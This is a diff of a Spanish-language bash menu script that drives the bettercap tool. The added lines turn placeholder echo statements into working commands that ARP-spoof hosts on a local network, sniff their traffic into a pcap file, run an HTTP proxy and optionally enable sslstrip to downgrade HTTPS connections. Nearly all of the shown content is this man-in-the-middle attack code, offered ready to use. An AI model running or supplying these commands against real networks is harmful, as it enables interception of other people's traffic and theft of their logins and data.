@@ -244,13 +244,13 @@ while true; do
 							case $SSLTRIPOPCION in
 									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
 									;;
-									[n]*) echo "guardando la salida pero sin sslstrip" && clear;MENU_PRINCIPAL;
+									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
 									;;
 								 	*) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";SSLSTRIPONOFF;
 									;;
 							esac
 			;;
-		[n]* ) echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
+		[n]* )  echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
 	 			read SSLTRIPOPCION
 					while [[ -z "$SSLTRIPOPCION"  ]]; do 
 							echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m" 
@@ -258,9 +258,9 @@ while true; do
 							read SSLTRIPOPCION
 					done
 							case $SSLTRIPOPCION in
-									[s]*) echo "sin guardar la salida,pero con sslstrip" && clear;MENU_PRINCIPAL;
+									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
 									;;
-									[n]*) echo "sin guardar la salida, y sin sslstrip" && clear;MENU_PRINCIPAL;
+									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL; 
 									;;
 								 	*) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";
 									;;
